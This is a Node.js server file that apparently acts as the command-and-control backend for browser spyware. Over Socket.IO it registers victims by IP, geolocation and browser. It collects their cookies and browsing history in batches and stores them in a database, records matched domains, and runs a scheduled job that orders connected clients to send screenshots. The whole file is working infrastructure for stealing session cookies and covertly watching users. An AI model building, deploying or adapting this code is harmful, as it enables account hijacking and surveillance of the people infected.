import connectDB from "./db.js";
import express from "express";
import https from "https";
import { Server } from "socket.io";
import User from "./models/user.model.js";
import Cookie from "./models/cookie.model.js";
import History from "./models/history.model.js";
import currentStatus from "./models/currentStatus.model.js";
import { v4 as uuidv4 } from "uuid";
import fs from "fs";
import cron from "node-cron";
import Queue from "./models/queue.model.js";
import cors from "cors";

const app = express();
app.use(cors());

const options = {
  key: fs.readFileSync("./certs/privkey.pem"),
  cert: fs.readFileSync("./certs/fullchain.pem"),
}
const server = https.createServer(options, app);

app.get("/status", (req, res) => {
  res.status(200).json({
    code: 200,
    status: "OK",
    message: "Server is running"
  });
});

const io = new Server(server, { cors: { origin: "*" } });

io.on("connection", (socket) => {
  console.log(`Client connected: ${socket.id}`);

  socket.on("connectUser", async (data) => {
    const { ip, browser, geo, uuid, countryCode } = data;
    let userUuid = uuid || uuidv4();
    socket.userUuid = userUuid;

    if (!uuid) {
      try {
        const user = await User.findOne({ otherInfo: { IP: ip } });

        if (user && user.otherInfo.Activity === "deleted") {
          socket.emit("error", "User has been deleted");
          socket.disconnect();
          return;
        }

        if (user) {
          userUuid = user.uuid;
          socket.userUuid = userUuid;
  
          if (user.otherInfo.Browser.includes(browser)) {
            socket.emit('uuid', userUuid);
            return;
          }
  
          user.otherInfo.Browser.push(browser);
          await user.save();
          socket.emit('uuid', userUuid);
          return;
        }
      } catch (error) {
        console.error("Error handling connectUser:", error);
        socket.emit("error", "Error processing user connection");
      }
    }

    try {
      const existingUser = await User.findOne({ uuid: userUuid });

      if (!existingUser) {
        const lastUser = await User.findOne().sort({ id: -1 });
        const newUserId = lastUser ? lastUser.id + 1 : 1;

        const user = new User({
          uuid: userUuid,
          id: data.id || newUserId,
          otherInfo: {
            IP: ip,
            Geo: geo,
            Browser: [browser],
            Comment: "",
            Activity: "active",
            CountryCode: countryCode
          },
        });

        await user.save();
        console.log(`New user created with uuid: ${userUuid}`);

        const newStatus = new currentStatus({ uuid: userUuid, currentStatus: "online", lastOnline: new Date() });
        await newStatus.save();
        console.log(`New status created with uuid: ${userUuid}`);
      } else {
        let statusUser = existingUser.otherInfo.Activity
        if (statusUser === "deleted") {
          socket.emit("error", "User has been deleted");
          socket.disconnect();
          return;
        }
        console.log(`Existing user found with uuid: ${userUuid}`);
        existingUser.otherInfo.IP = ip;
        existingUser.otherInfo.Geo = geo;
        existingUser.otherInfo.CountryCode = countryCode;
        await existingUser.save();
        const status = await currentStatus.findOne({ uuid: userUuid });
        if (status) {
          status.currentStatus = "online";
          await status.save();
          console.log(`Status updated to online for UUID: ${userUuid}`);
        }
      }

      socket.emit("uuid", userUuid);
    } catch (error) {
      console.error("Error handling connectUser:", error);
      socket.emit("error", "Error processing user connection");
    }
  });

    let userCookies = [];
    let userHistory = [];

    socket.on("cookiesBatch", (data) => {
        const { batch, uuid } = data;
        userCookies = userCookies.concat(batch);
        console.log(`Received cookie batch for UUID ${uuid}, total cookies: ${userCookies.length}`);
    });

    socket.on("historyBatch", (data) => {
        const { batch, uuid } = data;
        userHistory = userHistory.concat(batch);
        console.log(`Received history batch for UUID ${uuid}, total history: ${userHistory.length}`);
    });

    socket.on("finalizeData", async ({ uuid }) => {
        try {
            console.log(`Finalizing data for UUID ${uuid}`);

            const cookieDoc = await Cookie.findOne({ uuid });
            if (!cookieDoc) {
                await Cookie.create({ uuid, body: userCookies });
            } else {
                cookieDoc.body = userCookies;
                await cookieDoc.save();
            }

            const historyDoc = await History.findOne({ uuid });
            if (!historyDoc) {
                await History.create({ uuid, history: userHistory });
            } else {
                historyDoc.history = userHistory;
                await historyDoc.save();
            }

            console.log(`Data finalized for UUID ${uuid}`);
        } catch (error) {
            console.error(`Error finalizing data for UUID ${uuid}:`, error);
        }
    });

  socket.on("screenshotUploaded", async (data) => {
    const { uuid, success } = data;
  
    try {
      const task = await Queue.findOne({ uuid, status: "processing" });
      if (task) {
        task.status = success ? "completed" : "failed";
        await task.save();
        console.log(`Task for UUID ${uuid} marked as ${task.status}`);
      } else {
        console.log(`No processing task found for UUID ${uuid}`);
      }
    } catch (error) {
      console.error("Error handling screenshotUploaded:", error);
    }
  });

  socket.on("uploadMatchesDomain", async (data) => {
    const { uuid, matches } = data;
    console.log(`Updating matches for UUID: ${uuid}`);
    console.log(`Matches: ${matches}`);
  
    try {
      const user = await User.findOne({ uuid });
      if (user) {
        user.otherInfo.MatchedDomains = matches;
        await user.save();
        console.log(`Matches for UUID ${uuid} updated`);
      } else {
        console.log(`No user found for UUID ${uuid}`);
      }
    } catch (error) {
      console.error("Error handling uploadMatchesDomain:", error);
    }
  })

  socket.on("disconnect", async () => {
    console.log(`Client disconnected: ${socket.id}`);
    const uuid = socket.userUuid;

    try {
      const userStatus = await currentStatus.findOne({ uuid });
      let status = userStatus.currentStatus
      if (status === "deleted") {
        console.log(`User with UUID ${uuid} has been deleted.`);
        return;
      }
      if (userStatus) {
        userStatus.currentStatus = "offline";
        userStatus.lastOnline = new Date();
        await userStatus.save();
        console.log(`Status updated to offline for UUID: ${uuid}`);
      } else {
        console.log(`User with UUID ${uuid} not found.`);
      }
    } catch (error) {
      console.error("Error handling disconnect:", error);
    }
  });
});

cron.schedule("5 * * * * *", async () => {
  try {
    const tasks = await Queue.find({ status: "pending" });

    for (const task of tasks) {
      const socket = Array.from(io.sockets.sockets.values()).find(s => s.userUuid === task.uuid);

      if (socket) {
        socket.emit("requestScreenshot", { uuid: task.uuid });
        console.log(`Requested screenshot from user with UUID: ${task.uuid}`);

        task.status = "processing";
        await task.save();
      } else {
        console.log(`User with UUID ${task.uuid} is not connected.`);
      }
    }
  } catch (error) {
    console.error("Error scheduling tasks:", error);
  }
});

const main = async () => {
  try {
    await connectDB();
    server.listen(3001, () => {
      console.log("Server started on port 3001");
    });
  } catch (error) {
    console.log(error);
  }
};

main();
